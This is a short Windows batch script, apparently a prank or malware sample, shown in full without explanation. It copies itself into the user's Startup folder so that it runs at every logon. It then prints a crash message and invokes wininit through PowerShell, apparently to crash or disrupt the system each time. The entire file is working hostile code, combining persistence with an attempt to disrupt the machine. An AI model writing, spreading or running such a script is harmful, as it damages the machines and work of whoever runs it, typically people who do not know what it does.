@echo off
color 4
copy %0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
echo UMM, WHY CRASH...
powershell wininit
